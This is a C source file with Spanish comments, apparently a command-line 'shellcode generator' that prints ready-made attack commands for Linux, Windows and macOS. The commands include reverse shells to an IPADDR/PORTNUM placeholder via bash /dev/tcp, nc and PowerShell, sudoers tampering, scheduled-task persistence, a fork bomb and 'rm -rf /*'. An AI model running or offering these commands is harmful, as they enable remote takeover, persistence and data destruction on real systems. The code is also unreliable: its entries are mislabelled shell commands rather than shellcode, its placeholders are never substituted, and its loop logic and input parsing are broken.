#include <stdio.h>
#include <string.h>
#include "api.h"

// Estructura para representar el Shellcode
typedef struct {
    const char* os;
    const char* type;
    char* code; // Cambiado a no const para poder modificar si fuera necesario
} shellcode_t;

const shellcode_t shellcodes[] = {
    {"Linux", "Privilege Escalation", "execve(/bin/bash, 0, 0);"},
    {"Linux", "Persistence", "echo 'sudo echo \"ALLOWED=yes\" > /etc/sudoers' | sudo sh"},
    {"Linux", "Reverse Shell", "bash -c 'bash -i >& /dev/tcp/IPADDR/PORTNUM 0>&1'"}, // Actualizado para usar marcadores
    {"Linux", "Denial of Service", "for (( ; ; )) ; do : & done"},
    {"Linux", "Buffer Overflow", "/bin/cat /etc/passwd | /bin/sh"}
};

const shellcode_t windows_shellcodes[] = {
    {"Windows", "Malicious Payload", "WinExec(\"C:\\Path\\To\\malicious.exe\")"},
    {"Windows", "Persistence", "schtasks /create /sc ONSTART /tn MaliciousTask /tr \"C:\\Path\\To\\malicious.exe\" /F"},
    {"Windows", "Reverse Shell", "powershell.exe -Command $client = New-Object System.Net.Sockets.TCPClient('IPADDR', PORTNUM);$stream = $client.GetStream();[byte[]]$sendBytes = 0..65535|%{0};while($true){$stream.Write($sendBytes,0,$sendBytes.Length);$data = new-object byte[];$key = [text.encoding]::ASCII.GetString($stream.Read($data, 0, $data.length));if ($key -ne $null) {for ($i=0; $i -cmt $data.length; $i++) {$stream.Write([byte[]]($data[$i]), 0, 1)}}};$client.Close()}"}, // Actualizado
    {"Windows", "Denial of Service", ":\& cd \\& del %windir%\\*.txt /q /f/s"},
    {"Windows", "Buffer Overflow", "RUNDLL32.EXE USER32.DLL,AllocateMemory 75 0 800000 0 0"}
};

const shellcode_t macos_shellcodes[] = {
    {"macOS", "Persistence", "launchctl load -w /path/to/plistfile.plist"},
    {"macOS", "Reverse Shell", "nc -e /bin/bash IPADDR PORTNUM"}, // Actualizado
    {"macOS", "Denial of Service", "rm -rf /*"},
    {"macOS", "Buffer Overflow", "perl -e 'print \"A\" x 10000' > memory"},
    {"macOS", "Arbitrary File Write", "cp file1 /tmp/file2"}
};

const int num_linux_shellcodes = sizeof(shellcodes) / sizeof(shellcode_t);
const int num_windows_shellcodes = sizeof(windows_shellcodes) / sizeof(shellcode_t);
const int num_macos_shellcodes = sizeof(macos_shellcodes) / sizeof(shellcode_t);

void GenerateShellcode(char *platform, char *type) {
    char shellcodeBuffer[1024]; // Asumiendo que este tamaño es suficiente
    if (strcmp(platform, "Linux") == 0) {
        for (int i = 0; i < num_linux_shellcodes; ++i) {
            if (strcmp(type, shellcodes[i].type) == 0) {
                snprintf(shellcodeBuffer, sizeof(shellcodeBuffer), shellcodes[i].code, globalConfig.target_ip, globalConfig.target_port);
                printf("%s\n", shellcodeBuffer);
                break;
            }
        }
    } else if (strcmp(platform, "Windows") == 0) {
        for (int i = 0; i < num_windows_shellcodes; ++i) {
            if (strcmp(type, windows_shellcodes[i].type) == 0) {
                snprintf(shellcodeBuffer, sizeof(shellcodeBuffer), windows_shellcodes[i].code, globalConfig.target_ip, globalConfig.target_port);
                printf("%s\n", shellcodeBuffer);
            }
                break;
        }
    }else if (strcmp(platform, "macOS") == 0) {
        for (int i = 0; i < num_macos_shellcodes; ++i) {
            if (strcmp(type, macos_shellcodes[i].type) == 0) {
                snprintf(shellcodeBuffer, sizeof(shellcodeBuffer), macos_shellcodes[i].code, globalConfig.target_ip, globalConfig.target_port);
                printf("%s\n", shellcodeBuffer);
                break;
            }
        }
    } else {
        printf("Platform not supported.\n");
    }
}

void ShowAllShellcodes(char *platform) {
    if (strcmp(platform, "Linux") == 0) {
        for (int i = 0; i < num_linux_shellcodes; ++i) {
            printf("- %s\n", shellcodes[i].type);
        }
    } else if (strcmp(platform, "Windows") == 0) {
        for (int i = 0; i < num_windows_shellcodes; ++i) {
            printf("- %s\n", windows_shellcodes[i].type);
        }
    } else if (strcmp(platform, "macOS") == 0) {
        for (int i = 0; i < num_macos_shellcodes; ++i) {
            printf("- %s\n", macos_shellcodes[i].type);
        }
    } else {
        printf("Platform not supported.\n");
    }
}

int main() {
    char platform[8], type[20];
    memset(platform, 0x00, sizeof(platform));
    memset(type, 0x00, sizeof(type));

    // Especifique la plataforma de destino aquí
    printf("Enter platform (Linux, Windows, macOS): ");
    scanf("%7s", platform); // Asegura que no se exceda el tamaño del buffer

    // Especifique el tipo de Shellcode aquí
    printf("Enter shellcode type (e.g., 'Reverse Shell'): ");
    scanf("%19s", type); // Asegura que no se exceda el tamaño del buffer

    if (strcmp(type, "show") == 0) {
        ShowAllShellcodes(platform);
    } else {
        GenerateShellcode(platform, type);
    }

    return 0;
}
